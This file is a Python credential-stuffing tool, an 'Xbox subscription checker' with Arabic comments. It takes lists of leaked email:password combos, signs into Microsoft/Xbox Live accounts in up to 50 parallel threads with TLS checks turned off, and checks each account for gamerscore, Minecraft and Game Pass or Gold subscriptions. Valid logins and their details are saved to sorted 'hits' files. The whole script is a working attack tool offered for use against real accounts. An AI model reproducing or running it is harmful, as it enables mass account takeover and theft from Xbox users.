import os
import sys
import time
import requests
import re
import threading
from urllib.parse import urlparse, parse_qs
import urllib3
import concurrent.futures
from requests.adapters import HTTPAdapter
from datetime import datetime, timedelta
import json

urllib3.disable_warnings()

if os.name == 'nt':
    os.system('color')

GRAY = "\033[1;90m"
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
CYAN = "\033[1;96m"
MAGENTA = "\033[1;35m"
WHITE = "\033[1;97m"
RESET = "\033[0m"

LINE = GRAY + "-------------------------------------------------------------------" + RESET

checked = 0
total_combos = 0
hits = 0
bad = 0
twofa = 0
errors = 0
gamepass_count = 0
gold_count = 0
minecraft_count = 0
gscore_count = 0
start_time = 0
is_running = True

file_lock = threading.Lock()
stats_lock = threading.Lock()

def setup_folders():
    if not os.path.exists("XBOX_RESULT"):
        os.makedirs("XBOX_RESULT")

def save_hit(filename, content):
    filepath = os.path.join("XBOX_RESULT", filename)
    with file_lock:
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def get_cpm():
    elapsed = time.time() - start_time
    if elapsed > 2:
        return int((checked / elapsed) * 60)
    return 0

def get_subscription_from_store(session, uhs, xsts_token):
    """الحصول على الاشتراكات من متجر Xbox مباشرة"""
    try:
        # استخدام API المتجر للحصول على الاشتراكات
        store_url = "https://store.xbox.com/api/v1/subscriptions"
        headers = {
            "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
            "Accept": "application/json",
            "x-xbl-contract-version": "2"
        }
        
        response = session.get(store_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            # البحث عن الاشتراكات النشطة
            subscriptions = data.get('subscriptions', [])
            
            for sub in subscriptions:
                sub_name = sub.get('name', '').lower()
                sub_status = sub.get('status', '').lower()
                
                # التحقق من الاشتراك النشط
                if 'active' in sub_status or 'enabled' in sub_status:
                    # استخراج تاريخ الانتهاء
                    end_date = sub.get('endDate', 'N/A')
                    
                    # تحديد نوع الاشتراك
                    if 'game pass ultimate' in sub_name or 'gamepass ultimate' in sub_name:
                        return "Game Pass Ultimate", end_date
                    elif 'game pass pc' in sub_name or 'gamepass pc' in sub_name:
                        return "Game Pass PC", end_date
                    elif 'game pass core' in sub_name or 'gamepass core' in sub_name:
                        return "Game Pass Core", end_date
                    elif 'game pass standard' in sub_name or 'gamepass standard' in sub_name:
                        return "Game Pass Standard", end_date
                    elif 'game pass' in sub_name or 'gamepass' in sub_name:
                        return "Game Pass", end_date
                    elif 'xbox live gold' in sub_name or 'gold' in sub_name:
                        return "Xbox Live Gold", end_date
                    elif 'xbox game pass' in sub_name:
                        return "Game Pass", end_date
        
        return None, None
        
    except Exception as e:
        return None, None

def get_subscription_from_billing(session, uhs, xsts_token):
    """الحصول على الاشتراكات من نظام الفوترة"""
    try:
        billing_url = "https://billing.microsoft.com/api/v1/subscriptions"
        headers = {
            "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
            "Accept": "application/json"
        }
        
        response = session.get(billing_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            # البحث عن الاشتراكات النشطة
            for item in data:
                if item.get('status') == 'Active' or item.get('status') == 'active':
                    sub_name = item.get('name', '')
                    sub_type = item.get('type', '')
                    
                    # تحديد نوع الاشتراك
                    if 'ultimate' in sub_type.lower() or 'ultimate' in sub_name.lower():
                        return "Game Pass Ultimate", item.get('expiryDate', 'N/A')
                    elif 'pc' in sub_type.lower() or 'pc' in sub_name.lower():
                        return "Game Pass PC", item.get('expiryDate', 'N/A')
                    elif 'core' in sub_type.lower() or 'core' in sub_name.lower():
                        return "Game Pass Core", item.get('expiryDate', 'N/A')
                    elif 'standard' in sub_type.lower() or 'standard' in sub_name.lower():
                        return "Game Pass Standard", item.get('expiryDate', 'N/A')
                    elif 'game pass' in sub_type.lower() or 'game pass' in sub_name.lower():
                        return "Game Pass", item.get('expiryDate', 'N/A')
                    elif 'gold' in sub_type.lower() or 'gold' in sub_name.lower():
                        return "Xbox Live Gold", item.get('expiryDate', 'N/A')
        
        return None, None
        
    except Exception as e:
        return None, None

def get_subscription_from_profile(session, uhs, xsts_token):
    """الحصول على الاشتراكات من بروفايل المستخدم"""
    try:
        profile_url = "https://profile.xboxlive.com/users/me/profile/settings?settings=Subscriptions,GamePass"
        headers = {
            "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
            "x-xbl-contract-version": "2",
            "Accept": "application/json"
        }
        
        response = session.get(profile_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            settings = data.get('profileUsers', [{}])[0].get('settings', [])
            
            for setting in settings:
                if setting.get('id') == 'Subscriptions' or 'subscription' in setting.get('id', '').lower():
                    value = setting.get('value', '')
                    
                    # البحث عن اشتراكات في النص
                    if 'game pass' in value.lower() or 'gamepass' in value.lower():
                        # استخراج التاريخ
                        date_match = re.search(r'(\d{4}-\d{2}-\d{2})', value)
                        expiry_date = date_match.group(1) if date_match else 'N/A'
                        
                        # تحديد النوع
                        if 'ultimate' in value.lower():
                            return "Game Pass Ultimate", expiry_date
                        elif 'pc' in value.lower():
                            return "Game Pass PC", expiry_date
                        elif 'core' in value.lower():
                            return "Game Pass Core", expiry_date
                        elif 'standard' in value.lower():
                            return "Game Pass Standard", expiry_date
                        else:
                            return "Game Pass", expiry_date
                    
                    elif 'xbox live gold' in value.lower() or 'gold' in value.lower():
                        date_match = re.search(r'(\d{4}-\d{2}-\d{2})', value)
                        expiry_date = date_match.group(1) if date_match else 'N/A'
                        return "Xbox Live Gold", expiry_date
        
        return None, None
        
    except Exception as e:
        return None, None

def check_real_subscription(session, uhs, xsts_token):
    """التحقق الحقيقي من الاشتراكات بطرق متعددة"""
    
    # محاولة الطرق المختلفة
    methods = [
        get_subscription_from_store,
        get_subscription_from_billing,
        get_subscription_from_profile
    ]
    
    for method in methods:
        try:
            sub_type, expiry = method(session, uhs, xsts_token)
            if sub_type:
                return sub_type, expiry
        except:
            continue
    
    # إذا لم يتم العثور على اشتراك
    return None, None

def get_games_list(session, uhs, xsts_token):
    games_list = ""
    
    try:
        me_url = "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag"
        headers = {
            "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
            "x-xbl-contract-version": "2",
            "Accept": "application/json"
        }
        me_resp = session.get(me_url, headers=headers, timeout=10)
        if me_resp.status_code == 200:
            xuid = me_resp.json()['profileUsers'][0]['id']
            
            ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems=999"
            ach_resp = session.get(ach_url, headers=headers, timeout=10)
            
            if ach_resp.status_code == 200:
                titles = ach_resp.json().get('titles', [])
                for i, t in enumerate(titles, 1):
                    game_name = t.get('name', 'Unknown Game')
                    current_score = t.get('currentGamerscore', 0)
                    games_list += f"{i} - {game_name} | Score: {current_score}G\n"
    except:
        pass
    return games_list

def update_ui():
    sys.stdout.write("\033[?25l")
    os.system('cls' if os.name == 'nt' else 'clear')
    while is_running:
        cpm = get_cpm()
        percent = (checked / total_combos * 100) if total_combos > 0 else 0.0
        ui_text = f"""\033[H\033[K{LINE}
\033[K{WHITE} Checked : {CYAN}{checked}{WHITE}/{CYAN}{total_combos} {GRAY}| {WHITE}Hits: {GREEN}{hits} {GRAY}| {WHITE}Bad: {RED}{bad}{RESET}
\033[K{WHITE} Errors  : {RED}{errors} {GRAY}| {WHITE}2FA: {YELLOW}{twofa} {GRAY}| {WHITE}CPM: {MAGENTA}{cpm}{RESET}
\033[K{LINE}
\033[K{WHITE} 🎮 Game Pass      : {GREEN}{gamepass_count}{RESET}
\033[K{WHITE} 💰 Xbox Live Gold : {GREEN}{gold_count}{RESET}
\033[K{WHITE} ⛏️ Minecraft     : {GREEN}{minecraft_count}{RESET}
\033[K{WHITE} ⭐ G-Score       : {GREEN}{gscore_count}{RESET}
\033[K{LINE}
\033[K{WHITE} Status : {GREEN}{percent:.1f}%{RESET}
\033[K{LINE}
\033[K{GRAY} Programmer: @Veen0m | Channel: @slq_8{RESET}
"""
        sys.stdout.write(ui_text)
        sys.stdout.flush()
        time.sleep(0.3)
        
def check_account(combo):
    global checked, hits, bad, twofa, errors, gamepass_count, gold_count, minecraft_count, gscore_count
    
    parts = combo.split(':')
    if len(parts) < 2:
        with stats_lock: bad += 1; checked += 1
        return

    email, password = parts[0].strip(), ':'.join(parts[1:]).strip()
    session = requests.Session()
    session.verify = False
    session.mount('https://', HTTPAdapter(pool_connections=50, pool_maxsize=50))
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    
    try:
        # تسجيل الدخول
        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(sftag_url, timeout=15)
        sftag = re.search(r'value=\\\"(.+?)\\\"', resp.text).group(1)
        url_post = re.search(r'"urlPost":"(.+?)"', resp.text).group(1)
        login_req = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}, timeout=15)
        
        ms_token = None
        if 'access_token' in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
        elif "password is incorrect" in login_req.text.lower():
            with stats_lock: bad += 1; checked += 1
            return
        
        if not ms_token:
            with stats_lock: bad += 1; checked += 1
            return

        # توثيق Xbox
        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', 
            json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
            "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=15)
        
        if xb_req.status_code != 200:
            with stats_lock: bad += 1; checked += 1
            return
            
        xb_token = xb_req.json()['Token']
        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

        # XSTS token
        xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', 
            json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, 
            "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=15)
        
        if xsts_xb_req.status_code != 200:
            with stats_lock: bad += 1; checked += 1
            return
            
        xsts_token = xsts_xb_req.json()['Token']
        
        # جلب Gamerscore
        gamerscore_int = 0
        prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamerscore", 
            headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, timeout=15)
        if prof_req.status_code == 200:
            gamerscore_int = int(prof_req.json()['profileUsers'][0]['settings'][0]['value'])

        if gamerscore_int < 5:
            with stats_lock: bad += 1; checked += 1
            return

        # جلب قائمة الألعاب
        games_list = get_games_list(session, uhs, xsts_token)
        
        # التحقق من Minecraft
        has_minecraft = 'minecraft' in games_list.lower() if games_list else False
        
        # ===== التحقق الحقيقي من الاشتراكات =====
        sub_type, expiry_date = check_real_subscription(session, uhs, xsts_token)
        
        # حساب الأيام المتبقية
        days_left = "N/A"
        if expiry_date and expiry_date != "N/A":
            try:
                if 'T' in expiry_date:
                    expiry_obj = datetime.fromisoformat(expiry_date.replace('Z', '+00:00'))
                else:
                    expiry_obj = datetime.strptime(expiry_date, '%Y-%m-%d')
                
                days = (expiry_obj - datetime.now()).days
                if days >= 0:
                    days_left = f"{days} days"
                else:
                    days_left = f"Expired ({abs(days)} days ago)"
            except:
                days_left = "N/A"
        
        # تحديث الإحصائيات
        with stats_lock:
            hits += 1
            gscore_count += 1
            
            if has_minecraft:
                minecraft_count += 1
            
            if sub_type:
                if 'Game Pass' in sub_type:
                    gamepass_count += 1
                elif 'Gold' in sub_type:
                    gold_count += 1
            
            checked += 1

        # بناء النتيجة
        if sub_type:
            result = f"{email}:{password} | Subscription: ✅ {sub_type} | Expires: {expiry_date} | Days Left: {days_left} | Minecraft: {'✅' if has_minecraft else '❌'}"
        else:
            result = f"{email}:{password} | Subscription: ❌ No Subscription | Minecraft: {'✅' if has_minecraft else '❌'}"

        # حفظ النتائج
        save_hit("XBOX-Results.txt", result)
        
        if has_minecraft:
            save_hit("XBOX-Minecraft.txt", result)
        
        if sub_type and 'Game Pass' in sub_type:
            save_hit("XBOX-GamePass.txt", result)
        elif sub_type and 'Gold' in sub_type:
            save_hit("XBOX-Gold.txt", result)
        
        # طباعة في الكونسول
        if sub_type and 'Game Pass' in sub_type:
            print(f"{GREEN}[+] {result}{RESET}")
        elif sub_type and 'Gold' in sub_type:
            print(f"{YELLOW}[+] {result}{RESET}")
        else:
            print(f"{WHITE}[+] {result}{RESET}")
        
    except Exception as e:
        with stats_lock: errors += 1; checked += 1
    finally:
        session.close()

def main():
    global total_combos, start_time, is_running
    setup_folders()
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LINE)
    print(GREEN + " 🎮 XBOX SUBSCRIPTION CHECKER" + RESET)
    print(WHITE + " ─────────────────────────────" + RESET)
    print(WHITE + " 📌 Checks REAL Subscriptions:" + RESET)
    print(WHITE + "    • Game Pass (Ultimate/PC/Core/Standard)" + RESET)
    print(WHITE + "    • Xbox Live Gold" + RESET)
    print(WHITE + "    • Expiry Date" + RESET)
    print(WHITE + "    • Days Remaining" + RESET)
    print(WHITE + "    • Minecraft Ownership" + RESET)
    print(WHITE + " ─────────────────────────────" + RESET)
    print(WHITE + " 👨‍💻 Programmer: @slq_8" + RESET)
    print(LINE)
    
    combo_path = input(f"{WHITE} 📂 Enter Combo File Path: {CYAN}").strip()
    if not os.path.exists(combo_path):
        print(f"{RED} ❌ File not found!{RESET}")
        return

    try:
        threads_input = input(f"{WHITE} 🧵 Enter Threads (1-50): {CYAN}").strip()
        threads = int(threads_input)
        threads = max(1, min(threads, 50))
    except: 
        threads = 30

    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [l.strip() for l in f if ':' in l]
    
    total_combos = len(combos)
    if total_combos == 0:
        print(f"{RED} ❌ No valid combos found!{RESET}")
        return
    
    print(f"{GREEN} ✅ Loaded {total_combos} accounts{RESET}")
    print(LINE)
    
    start_time = time.time()
    threading.Thread(target=update_ui, daemon=True).start()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_account, c) for c in combos]
        for future in concurrent.futures.as_completed(futures):
            pass

    is_running = False
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LINE)
    print(f"{GREEN} ✅ CHECKING COMPLETED!{RESET}")
    print(LINE)
    print(f"{WHITE} 📊 Total Hits    : {GREEN}{hits}{RESET}")
    print(f"{WHITE} 🎮 Game Pass    : {GREEN}{gamepass_count}{RESET}")
    print(f"{WHITE} 💰 Xbox Live Gold: {GREEN}{gold_count}{RESET}")
    print(f"{WHITE} ⛏️ Minecraft   : {GREEN}{minecraft_count}{RESET}")
    print(LINE)
    print(f"{GREEN} 📁 Results saved in: XBOX_RESULT{RESET}")
    print(f"{WHITE}  • All Results    : XBOX-Results.txt{RESET}")
    print(f"{WHITE}  • Game Pass Only : XBOX-GamePass.txt{RESET}")
    print(f"{WHITE}  • Gold Only      : XBOX-Gold.txt{RESET}")
    print(f"{WHITE}  • Minecraft Only : XBOX-Minecraft.txt{RESET}")
    print(LINE)

if __name__ == "__main__":
    main()